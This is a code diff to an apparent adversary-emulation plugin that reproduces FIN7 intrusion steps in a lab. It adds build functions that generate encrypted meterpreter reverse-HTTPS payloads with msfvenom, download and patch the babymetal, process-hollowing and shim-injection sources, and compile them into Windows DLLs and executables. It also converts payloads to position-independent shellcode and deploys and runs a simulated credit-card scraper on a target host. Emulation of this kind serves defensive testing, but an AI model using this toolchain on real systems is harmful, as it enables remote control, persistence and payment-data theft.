@@ -106,6 +106,61 @@ class FIN7Plugin(AttackPlugin):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 3: Target Assessment{CommandlineColors.ENDC}", 1)
 
+    def build_step4(self):
+        """ Builds tools for step 4"""
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKBLUE}Step 4 compiling tools{CommandlineColors.ENDC}", 1)
+
+        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_4")
+
+        hotelmanager = self.get_target_by_name("hotelmanager")
+
+        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
+        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
+        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
+        # -f C                : output is c code
+        # --encrypt xor       : xor encrypt the results
+        # --encrypt-key m     : the encryption key
+
+        # Generate shellcode
+        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
+        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
+        venom.generate_payload(payload=self.payload_type_1,
+                               architecture="x64",
+                               platform="windows",
+                               lhost=self.attacker_machine_plugin.get_ip(),
+                               lport="443",
+                               exitfunc="thread",
+                               format="c",
+                               encrypt="xor",
+                               encrypt_key="m",
+                               outfile="step_4_shellcode.c")
+
+        self.attacker_machine_plugin.remote_run("mv step_4_shellcode.c tool_factory/step_4/shellcode.c")
+
+        # get C source
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_4; rm babymetal.cpp; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp")
+
+        # paste shellcode into C source
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory; python3 insert_shellcode.py --original_file step_4/babymetal.cpp --shellcode_file step_4/shellcode.c --out_file step_4/babymetal_patched.cpp")
+
+        # Compile to DLL
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_4; sed -i 's/#include <Windows.h>/#include <windows.h>/g' babymetal_patched.cpp")
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_4;x86_64-w64-mingw32-g++ -shared babymetal_patched.cpp -o babymetal.dll")
+
+        # sRDI conversion
+        self.attacker_machine_plugin.remote_run("cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py -f BabyMetal step_4/babymetal.dll")
+
+        # base64 conversion
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_4; base64 babymetal.bin > babymetal_encoded.txt")
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKGREEN}Step 4 compiling tools{CommandlineColors.ENDC}", 1)
+
     def step4(self):
         """ Create staging payload and inject it into powsershell.exe
         https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
@@ -121,15 +176,10 @@ class FIN7Plugin(AttackPlugin):
         # Generate payload:
 
         hotelmanager = self.get_target_by_name("hotelmanager")
+        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_4")
         payload_name = "babymetal.exe"
 
-        # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps. For the proper steps see:
-        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
-        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
-        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
-        # -f C                : output is c code
-        # --encrypt xor       : xor encrypt the results
-        # --encrypt-key m     : the encryption key
+        # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps.
 
         venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
         venom.generate_and_deploy(payload=self.payload_type_1,
@@ -140,15 +190,6 @@ class FIN7Plugin(AttackPlugin):
                                   outfile=payload_name)
 
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute babymetal replacement - waiting for meterpreter shell{CommandlineColors.ENDC}", 1)
-
-        # TODO: Add shellcode code into C file, compile
-
-        # TODO. Call convertto_shellcode ps1 ( needs a windows attacker machine or powershell on the attacker !)
-        # sudo apt install powershell
-        # pwsh
-        # result is babymetal.dll
-
-        # TODO: convert to base64
 
         # TODO: target already runs adb156.exe. This one gets the shellcode and decodes it.
         # TODO: adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/
@@ -226,6 +267,61 @@ class FIN7Plugin(AttackPlugin):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)
 
+    def build_step6(self):
+        """ Builds tools for step 6 """
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKBLUE}Step 6 compiling tools{CommandlineColors.ENDC}", 1)
+
+        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_6")
+
+        hotelmanager = self.get_target_by_name("hotelmanager")
+
+        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
+        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
+        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
+        # -f C                : output is c code
+        # --encrypt xor       : xor encrypt the results
+        # --encrypt-key m     : the encryption key
+
+        # Generate shellcode
+        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f exe -o msf.exe
+        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
+        venom.generate_payload(payload=self.payload_type_1,
+                               architecture="x64",
+                               platform="windows",
+                               lhost=self.attacker_machine_plugin.get_ip(),
+                               lport="443",
+                               format="exe",
+                               outfile="msf.executable")
+
+        self.attacker_machine_plugin.remote_run("mv msf.executable tool_factory/step_6/msf.executable")
+
+        # xxd   xxd -i msf.exe
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6/; xxd -i msf.executable > MSFPayload.h")
+
+        # Get ProcessHollowing.c
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_6; rm ProcessHollowing.c; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step6/Hollow/ProcessHollowing.c")
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_6; sed -i 's/#include <Windows.h>/#include <windows.h>/g' ProcessHollowing.c")
+
+        # TODO: Patch header
+        # self.attacker_machine_plugin.remote_run(
+        #    "cd tool_factory; python3 insert_shellcode.py --original_file step_6/ProcessHollowing.c --shellcode_file step_6/msfpayload --out_file step_6/processhollowing_patched.cpp")
+
+        # Fix unicode
+        # LPSTR tgt_process = "C:\\Windows\\system32\\svchost.exe";
+        # TEXT(tgt_process)
+        self.attacker_machine_plugin.remote_run(r"cd tool_factory/step_6; sed -i 's/TEXT(tgt_process)/TEXT(\"C:\\\\Windows\\\\system32\\\\svchost.exe\")/g' ProcessHollowing.c")
+
+        # Compiled for 64 bit.
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6; rm hollow.exe;")
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6; x86_64-w64-mingw32-gcc -municode -D UNICODE -D _UNICODE ProcessHollowing.c -L/usr/x86_64-w64-mingw32/lib/ -l:libntdll.a -o hollow.exe")
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKGREEN}Step 6 compiling tools{CommandlineColors.ENDC}", 1)
+
     def step6(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 6 (target hotelmanager -> itadmin): Expand Access{CommandlineColors.ENDC}", 1)
@@ -243,11 +339,44 @@ class FIN7Plugin(AttackPlugin):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 6: Expand Access{CommandlineColors.ENDC}", 1)
 
+    def build_step7(self):
+        """ Builds tools for step 7 """
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKBLUE}Step 7 compiling tools{CommandlineColors.ENDC}", 1)
+
+        # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step7/BOOSTWRITE-src
+
+        # TODO: Create VS Studio DLl project
+
+        # TODO msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f dll -o msf.dll
+
+        # TODO install curl and zlib dev
+        # libcurl4-gnutls-dev, libcurlpp-dev (c++), libz-mingw-w64-dev,
+        # But the libraries are also in https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step7/BOOSTWRITE-src/curl
+
+        # TODO  SRDI to create PIC code
+        # python3 ../sRDI/Python/ConvertToShellcode.py  msf.dll
+
+        # TODO Create C array of sRDI DLL   xxd -i msf.exe
+        # mv msf.bin shellcode
+        # xxd -i shellcode
+
+        # TODO add own payload to msfpayload.h
+
+        # TODO dllmain.cpp: patch attacker ip into it
+
+        # TODO Build
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKGREEN}Step 7 compiling tools{CommandlineColors.ENDC}", 1)
+
     def step7(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 7 on itadmin: Setup User Monitoring{CommandlineColors.ENDC}", 1)
 
         # Start situation: Step 6 executed a meterpreter in hollow.exe We can fake that to be able to start with step 7 directly
+        # BOOSTWRITE does DLL Hijack within a propriteary piece of software (Aloha Command Center)
 
         # This is meterpreter !
         # Emulating DLL hijacking functionality of BOOSTWRITE
@@ -278,6 +407,56 @@ class FIN7Plugin(AttackPlugin):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 8: User Monitoring{CommandlineColors.ENDC}", 1)
 
+    def build_step9(self):
+        """ Builds tools for step 9 """
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKBLUE}Step 9 compiling tools{CommandlineColors.ENDC}", 1)
+
+        accounting = self.get_target_by_name("accounting")
+        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_9")
+
+        # msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=53 -f dll -o payload.dll
+        venom = MSFVenom(self.attacker_machine_plugin, accounting, self.attack_logger)
+        venom.generate_payload(payload="windows/meterpreter/reverse_https",
+                               architecture="x86",
+                               platform="windows",
+                               lhost=self.attacker_machine_plugin.get_ip(),
+                               lport="53",
+                               format="dll",
+                               outfile="payload.dll")
+
+        # python3 sRDI/Python/ConvertToShellcode.py payload.dll
+        self.attacker_machine_plugin.remote_run("mv payload.dll tool_factory/step_9")
+        self.attacker_machine_plugin.remote_run("cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py step_9/payload.dll")
+
+        # mv payload.bin bin329.tmp
+        self.attacker_machine_plugin.remote_run("cp tool_factory/step_9/payload.bin tool_factory/step_9/bin329.tmp")
+        # This will be stored in the registry
+
+        # ## DLL 329
+        # Build https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step9/InjectDLL-Shim
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_9; rm dllmain.cpp")
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/dllmain.cpp")
+
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm pe.cpp;")
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.cpp")
+
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm pe.h;")
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.h")
+
+        # Compiling dll 329
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm dll329.dll;")
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; i686-w64-mingw32-g++ -m32 -shared -municode -D UNICODE -D _UNICODE -fpermissive dllmain.cpp pe.cpp -L/usr/i686-w64-mingw32/lib/ -l:libntoskrnl.a -l:libntdll.a -o dll329.dll")
+
+        # ## sdbE376.tmp
+        # Just download https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm sdbE376.tmp")
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp")
+
+        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Step 9 compiling tools{CommandlineColors.ENDC}", 1)
+
     def step9(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 9 (target: accounting): Setup Shim Persistence{CommandlineColors.ENDC}", 1)
@@ -291,7 +470,57 @@ class FIN7Plugin(AttackPlugin):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 9: Setup Shim Persistence{CommandlineColors.ENDC}", 1)
 
+    def build_step10(self):
+        """ Builds the tools required for step 10
+
+        :return:
+        """
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKBLUE}Step 10 compiling tools{CommandlineColors.ENDC}", 1)
+
+        # Compiling
+
+        # i686-w64-mingw32-gcc is for 32 bit
+        # x86_64-w64-mingw32-gcc is for 64 bit
+
+        # Important: pillowMint is not very complex and looks for the data at a fixed address. As we a re-compiling AccountIQ.exe and the data address does not match the expected one we will just get garbage.
+
+        # simulated credit card tool as target
+        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_10")  # MSFVenom needs to be installed
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_10; rm AccountingIQ.exe")
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_10; rm AccountingIQ.c; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c")
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_10; i686-w64-mingw32-gcc -m32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include AccountingIQ.c -o AccountingIQ.exe")
+
+        self.attacker_machine_plugin.get("tool_factory/step_10/AccountingIQ.exe",
+                                         os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
+                                                      "AccountingIQ.exe"))
+
+        # Simulated credit card scraper
+        self.attacker_machine_plugin.remote_run("cd tool_factory/step_10; rm pillowMint.exe")
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_10; rm pillowMint.cpp; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/pillowMint.cpp")
+        self.attacker_machine_plugin.remote_run(
+            "cd tool_factory/step_10; x86_64-w64-mingw32-g++ -static pillowMint.cpp -o pillowMint.exe")
+        self.attacker_machine_plugin.get("tool_factory/step_10/pillowMint.exe",
+                                         os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
+                                                      "pillowMint.exe"))
+
+        accounting = self.get_target_by_name("accounting")
+        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"),
+                       "pillowMint.exe")
+        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "AccountingIQ.exe"),
+                       "AccountingIQ.exe")
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKGREEN}Step 10 compiling tools{CommandlineColors.ENDC}", 1)
+
     def step10(self):
+
+        accounting = self.get_target_by_name("accounting")
+
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 10 (target: accounting): Steal Payment Data{CommandlineColors.ENDC}", 1)
 
@@ -305,30 +534,6 @@ class FIN7Plugin(AttackPlugin):
         # TODO: debug.exe(pillowMint.exe) is downloaded from C2, does process discovery https://attack.mitre.org/techniques/T1105/
         # TODO: send 7za.exe to target. Zip stolen data, exfiltrate
 
-        # Compiling
-
-        # i686-w64-mingw32-gcc is for 32 bit
-        # x86_64-w64-mingw32-gcc is for 64 bit
-
-        # Important: pillowMint is not very complex and looks for the data at a fixed address. As we a re-compiling AccountIQ.exe and the data address does not match the expected one we will just get garbage.
-
-        # simulated credit card tool as target
-        self.attacker_machine_plugin.remote_run("cd tool_factory; rm AccountingIQ.exe")
-        self.attacker_machine_plugin.remote_run("cd tool_factory; rm AccountingIQ.c; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c")
-        self.attacker_machine_plugin.remote_run("cd tool_factory; i686-w64-mingw32-gcc -m32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include AccountingIQ.c -o AccountingIQ.exe")
-
-        self.attacker_machine_plugin.get("tool_factory/AccountingIQ.exe", os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "AccountingIQ.exe"))
-
-        # Simulated credit card scraper
-        self.attacker_machine_plugin.remote_run("cd tool_factory; rm pillowMint.exe")
-        self.attacker_machine_plugin.remote_run("cd tool_factory; rm pillowMint.cpp; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/pillowMint.cpp")
-        self.attacker_machine_plugin.remote_run("cd tool_factory; x86_64-w64-mingw32-g++ -static pillowMint.cpp -o pillowMint.exe")
-        self.attacker_machine_plugin.get("tool_factory/pillowMint.exe", os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"))
-
-        accounting = self.get_target_by_name("accounting")
-        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"), "pillowMint.exe")
-        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "AccountingIQ.exe"), "AccountingIQ.exe")
-
         accounting.remote_run("AccountingIQ.exe", disown=True)
         time.sleep(1)
         accounting.remote_run("pillowMint.exe", disown=False)
@@ -337,7 +542,7 @@ class FIN7Plugin(AttackPlugin):
             f"{CommandlineColors.OKGREEN}End Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)
 
     def install(self):
-        """ Install tools for the attack """
+        """ Install tools for the attack. Here those are especially build tools """
 
         self.attacker_machine_plugin.remote_run("mkdir tool_factory")  # MSFVenom needs to be installed
         self.attacker_machine_plugin.remote_run("sudo apt -y install msfpc")  # MSFVenom needs to be installed
@@ -346,6 +551,12 @@ class FIN7Plugin(AttackPlugin):
         self.attacker_machine_plugin.remote_run("sudo apt -y install powershell")  # Microsoft powershell
         self.attacker_machine_plugin.remote_run("sudo apt -y install g++-multilib libc6-dev-i386")  # 32 bit support
         self.attacker_machine_plugin.remote_run("cd tool_factory; git clone https://github.com/monoxgas/sRDI")  # To generate PIC
+        # putting own insert_shellcode too to attacker
+        self.attacker_machine_plugin.put(
+            os.path.join(self.main_path(), "tools", "insert_shellcode.py"), os.path.join("tool_factory", "insert_shellcode.py"))
+
+        #  self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"),
+        #               "pillowMint.exe")
 
     def run(self, targets):
         """ Run the command
@@ -353,15 +564,26 @@ class FIN7Plugin(AttackPlugin):
         @param targets: A list of targets
         """
 
+        # Those build calls will be called from the steps directly. But it is always conveniet for testing to use that now directly while developing
+        # Building the tools is temporarily de-activated. Without the proper environment the tools being built are useless. Many attacks run on temporary attacks
+        if False:
+            self.build_step4()  # DONE
+            self.build_step6()  # DONE
+            # TODO: self.build_step7()  # Will not be done until the environment is planned. This step needs Aloha Command Center on the target. Maybe we write our own vulnerable app....
+
+            self.build_step9()
+
+            self.build_step10()  # DONE
+
         # self.step1()
         # self.step2()
-        # self.step3()  # DONE and works
-        # self.step4()  # PARTIAL - with a hack. Needs compilation of babymetal: Needs a powershell to execute on the build system. And this one needs system access
-        # self.step5()  # DONE and quite ok
+        self.step3()  # DONE and works
+        self.step4()  # PARTIAL - with a hack. Needs compilation of babymetal: Needs a powershell to execute on the build system. And this one needs system access
+        self.step5()  # DONE and quite ok
         # self.step6()  # Hollow.exe has to be generated
         # self.step7()  # Will need compilation of an attack tool Boostwrite
         # self.step8()  # Migration and credential collection, on itadmin
         # self.step9()  # on accounting, shim persistence bin329.tmp needs to be generated
-        self.step10()  # on accounting, AccountingIQ.c needs compilation. But just once.
+        # self.step10()  # on accounting, AccountingIQ.c needs compilation. But just once.
 
         return ""
